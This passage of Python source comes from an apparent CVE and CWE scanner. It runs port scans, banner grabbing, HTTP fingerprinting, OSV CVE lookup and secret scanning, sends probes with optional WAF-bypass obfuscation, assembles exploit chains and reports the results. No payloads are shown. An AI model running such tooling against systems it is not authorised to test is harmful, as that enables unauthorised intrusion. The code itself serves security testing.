        for payload in probe["payloads"]:
            variants = obfuscate(payload) if PROBE_WAF_BYPASS else [payload]
            for variant in variants:
                for pt in points:
                    key = (pt["url"], pt["method"], tuple(sorted(pt["params"])))
                    baseline = baselines.get(key)
                    rec = _cwe_attempt(
                        target, cwe_id, probe, pt, variant, sess, limiter, baseline
                    )
                    records.append(rec)
                    if rec["result"] == "CONFIRMED":
                        confirmed_this = True
                        confirmed(cwe_id, probe["label"], rec["evidence"])
                        break
                if confirmed_this:
                    break
            if confirmed_this:
                break
    return records


# ─── PER-TARGET PIPELINE ──────────────────────────────────────────────
def _resolve_url_and_host(target, sess):
    cands = normalize_target(target)
    info(f"Candidates: {cands}")
    working = detect_working_url(cands, sess)
    if working:
        url, st = working
        info(f"Working URL: {url} (HTTP {st})")
    else:
        url = None
        warn("No HTTP/HTTPS endpoint responded")
    host = extract_host(target)
    info(f"Host: {host}")
    return url, host


def _scan_ports(host, ports, timeout, workers):
    open_ports = port_scan(host, ports, timeout, workers)
    port_data = [{"port": p, "service": s} for p, s in sorted(open_ports.items())]
    if not open_ports:
        info("No common ports open")
        return open_ports, port_data
    info(f"Open: {sorted(open_ports.keys())}")
    for p, s in sorted(open_ports.items()):
        finding("INFO", f"port-{p}", f"{s} open")
    return open_ports, port_data


def _tech_label(d):
    if "port" in d:
        return f"{d['name']} {d['version']} on port {d['port']}"
    return f"{d['name']} {d['version']} via HTTP"


def _scan_banners(host, open_ports):
    techs = []
    for port in open_ports:
        raw = auto_banner(host, port)
        if not raw:
            continue
        info(f"Port {port}: {raw[:100]!r}")
        for d in fingerprint_banner(raw):
            d["port"] = port
            finding("INFO", d["name"], _tech_label(d))
            techs.append(d)
    return techs


def _scan_http_tech(url, sess):
    techs = fingerprint_http(url, sess)
    for d in techs:
        finding("INFO", d["name"], _tech_label(d))
    return techs


def _resolve_cves(technologies):
    from_osv = set()
    if LOOKUP_OSV and technologies:
        looked = set()
        for d in technologies:
            product = (d.get("product") or "").lower()
            version = d.get("version")
            if not product or not version:
                continue
            if product not in OSV_ECOSYSTEM_MAP:
                continue
            key = (product, version)
            if key in looked:
                continue
            looked.add(key)
            cves = osv_lookup(product, version)
            info(f"  {product} {version}: {len(cves)} CVE(s) from OSV")
            from_osv.update(cves)
    all_cves = set(CVE_PROBES.keys()) | from_osv
    testable = sorted(c for c in all_cves if c in CVE_PROBES)
    untested = sorted(c for c in all_cves if c not in CVE_PROBES)
    return testable, untested


def scan_target(target, sess):
    tgt(f"SCAN: {target}")
    recon = {
        "target": target,
        "host": None,
        "working_url": None,
        "open_ports": [],
        "technologies": [],
        "waf": None,
        "secrets": [],
        "known_cves": {"testable": [], "untested": []},
        "exploit_chains": [],
    }

    url, host = _resolve_url_and_host(target, sess)
    recon["host"] = host
    recon["working_url"] = url

    open_ports = {}
    if SCAN_PORTS:
        step("Port scan")
        ports = CUSTOM_PORTS or COMMON_PORTS
        open_ports, port_data = _scan_ports(
            host, ports, PORT_SCAN_TIMEOUT, PORT_SCAN_WORKERS
        )
        recon["open_ports"] = port_data

    if GRAB_BANNERS and open_ports:
        step("Banner grab")
        recon["technologies"].extend(_scan_banners(host, open_ports))

    if url and FINGERPRINT_HTTP:
        step("HTTP fingerprint")
        recon["technologies"].extend(_scan_http_tech(url, sess))

    tests = []
    need_page = url and (TEST_CVES or TEST_CWES or SCAN_SECRETS)
    if not need_page:
        return recon, tests

    page = sess.get(url, timeout=PROBE_TIMEOUT, allow_redirects=True)

    if page:
        waf = detect_waf(page.status_code, page.headers, page.text)
        if waf:
            recon["waf"] = waf
            warn(f"WAF detected: {waf['vendor']}")

    if SCAN_SECRETS and page:
        step("Secret scan")
        secrets = _scan_target_secrets(target, url, page, sess)
        recon["secrets"] = secrets
        for s in secrets:
            finding("HIGH", s["rule"], s["source"])

    limiter = RateLimiter(PROBE_RATE, PROBE_JITTER)

    if LOOKUP_OSV and recon["technologies"]:
        step(f"OSV lookup ({len(recon['technologies'])} technology/technologies)")
    testable, untested = _resolve_cves(recon["technologies"])
    recon["known_cves"] = {"testable": testable, "untested": untested}

    if TEST_CVES:
        step(f"CVE probing ({len(testable)} testable, "
             f"{len(untested)} untested from OSV)")
        tests.extend(_probe_cves(target, url, testable, sess, limiter))

    if TEST_CWES and page:
        tests.extend(_probe_cwes(target, url, page, sess, limiter))

    if BUILD_ATTACK_CHAINS:
        recon["exploit_chains"] = _build_chains(tests)
        for ch in recon["exploit_chains"]:
            finding("HIGH", ch["name"], ch["description"])

    return recon, tests


# ─── REPORTING ────────────────────────────────────────────────────────
def _summary_counts(tests):
    counts = {
        "total_tests": len(tests),
        "confirmed": 0, "waf_blocked": 0,
        "not_reproduced": 0, "errors": 0,
    }
    for t in tests:
        r = t.get("result", "")
        if r == "CONFIRMED":
            counts["confirmed"] += 1
        elif r == "WAF_BLOCKED":
            counts["waf_blocked"] += 1
        elif r == "NOT_REPRODUCED":
            counts["not_reproduced"] += 1
        elif r == "ERROR":
            counts["errors"] += 1
    return counts


def _print_summary(tests):
    if not tests:
        info("No tests run.")
        return
    bar = "\u2500" * 88
    LOG("\n" + bar)
    LOG("SUMMARY")
    LOG(bar)

    confirmed_tests = [t for t in tests if t["result"] == "CONFIRMED"]
    blocked_tests = [t for t in tests if t["result"] == "WAF_BLOCKED"]

    if confirmed_tests:
        LOG(f"  CONFIRMED ({len(confirmed_tests)}):")
        for t in confirmed_tests:
            ident = t.get("cve_id") or t.get("cwe_id") or "?"
            finding("HIGH", ident, t.get("label", "")[:100])
            info(f"    {t.get('endpoint', '')[:150]}")
            info(f"    evidence: {t.get('evidence', '')[:150]}")

    if blocked_tests:
        LOG(f"\n  BLOCKED BY WAF ({len(blocked_tests)}):")
        seen = set()
        for t in blocked_tests:
            ident = t.get("cve_id") or t.get("cwe_id") or "?"
            if ident in seen:
                continue
            seen.add(ident)
            finding("MEDIUM", ident, t.get("label", "")[:100])

    counts = _summary_counts(tests)
    LOG("\n" + bar)
    LOG(f"  Tests total   : {counts['total_tests']}")
    LOG(f"  Confirmed     : {counts['confirmed']}")
    LOG(f"  Blocked (WAF) : {counts['waf_blocked']}")
    LOG(f"  Not reproduced: {counts['not_reproduced']}")
    LOG(f"  Errors        : {counts['errors']}")
    LOG(bar)


def _save_json(data, p):
    try:
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
        info(f"JSON saved: {p}")
    except (OSError, ValueError, TypeError) as e:
        err(f"Could not write JSON ({p}): {e}")


# ─── RUNNER ───────────────────────────────────────────────────────────
_TIMEOUT = object()


def run_with_deadline(fn, args=(), kwargs=None, timeout=60):
    kwargs = kwargs or {}
    box = {"result": None, "error": None}
    done = threading.Event()

    def runner():
        try:
            box["result"] = fn(*args, **kwargs)
        except BaseException as e:
            box["error"] = e
        finally:
            done.set()

    t = threading.Thread(target=runner, daemon=True)
    t.start()
    if done.wait(timeout):
        if box["error"] is not None:
            raise box["error"]
        return box["result"]
    return _TIMEOUT


def _scan_all_targets():
    all_recon = []
    all_tests = []
    errors = []
    for i, target in enumerate(TARGETS, 1):
        try:
            LOG(f"\n[{i}/{len(TARGETS)}] Scanning {target}")
            result = run_with_deadline(
                scan_target, args=(target, Session()), timeout=TARGET_TIMEOUT
            )
            if result is _TIMEOUT:
                msg = f"Target {target} exceeded {TARGET_TIMEOUT}s; moving on"
                warn(msg)
                errors.append({"target": target, "type": "timeout", "error": msg})
                continue
            recon, tests = result
            all_recon.append(recon)
            all_tests.extend(tests)
        except KeyboardInterrupt:
            warn("Interrupted")
            errors.append(
                {"target": target, "type": "interrupt", "error": "Interrupted"}
            )
            break
        except Exception as e:
            err(f"Target failed: {e}")
            errors.append({"target": target, "type": "exception", "error": str(e)})
            continue
    return all_recon, all_tests, errors


def main():
    global LOG
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y%m%d-%H%M%S")
    LOG = Log()

    bar = "\u2550" * 88
    LOG(
        f"\n{bar}\n"
        f"  CVE Scanner\n"
        f"  Targets : {len(TARGETS)}\n"
        f"  Output  : {OUTPUT_DIR.absolute()}\n"
        f"{bar}"
    )

    started = time.monotonic()
    all_recon, all_tests, errors = _scan_all_targets()
    duration = time.monotonic() - started

    _print_summary(all_tests)
    LOG(
        f"\n{bar}\n"
        f"  DONE \u2014 {len(all_tests)} test(s), "
        f"{_summary_counts(all_tests)['confirmed']} confirmed, "
        f"from {len(TARGETS)} target(s) in {duration:.1f}s\n"
        f"{bar}\n"
    )

    all_secrets = [s for r in all_recon for s in r.get("secrets", [])]
    all_chains = [
        dict(ch, target=r["target"])
        for r in all_recon
        for ch in r.get("exploit_chains", [])
    ]

    summary = _summary_counts(all_tests)
    summary["targets_scanned"] = len(all_recon)
    summary["targets_failed"] = len(errors)
    summary["secrets_found"] = len(all_secrets)
    summary["exploit_chains_found"] = len(all_chains)

    output = {
        "timestamp": ts,
        "targets": TARGETS,
        "duration_seconds": round(duration, 1),
        "config": {
            "scan_ports": SCAN_PORTS,
            "grab_banners": GRAB_BANNERS,
            "fingerprint_http": FINGERPRINT_HTTP,
            "test_cves": TEST_CVES,
            "test_cwes": TEST_CWES,
            "lookup_osv": LOOKUP_OSV,
            "scan_secrets": SCAN_SECRETS,
            "build_attack_chains": BUILD_ATTACK_CHAINS,
            "insecure_tls": INSECURE_TLS,
            "port_scan_timeout": PORT_SCAN_TIMEOUT,
            "port_scan_workers": PORT_SCAN_WORKERS,
            "probe_timeout": PROBE_TIMEOUT,
            "probe_waf_bypass": PROBE_WAF_BYPASS,
            "probe_rate": PROBE_RATE,
            "probe_jitter": PROBE_JITTER,
            "target_timeout": TARGET_TIMEOUT,
            "total_cve_probes": len(CVE_PROBES),
            "total_cwe_probes": len(CWE_PROBES),
        },
        "summary": summary,
        "errors": errors,
        "recon": all_recon,
        "test_results": all_tests,
        "secrets": all_secrets,
        "exploit_chains": all_chains,
        "logs": LOG.messages,
    }

    if SAVE_JSON:
        _save_json(output, OUTPUT_DIR / f"scan-{ts}.json")

    LOG.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user.")
        sys.exit(130)
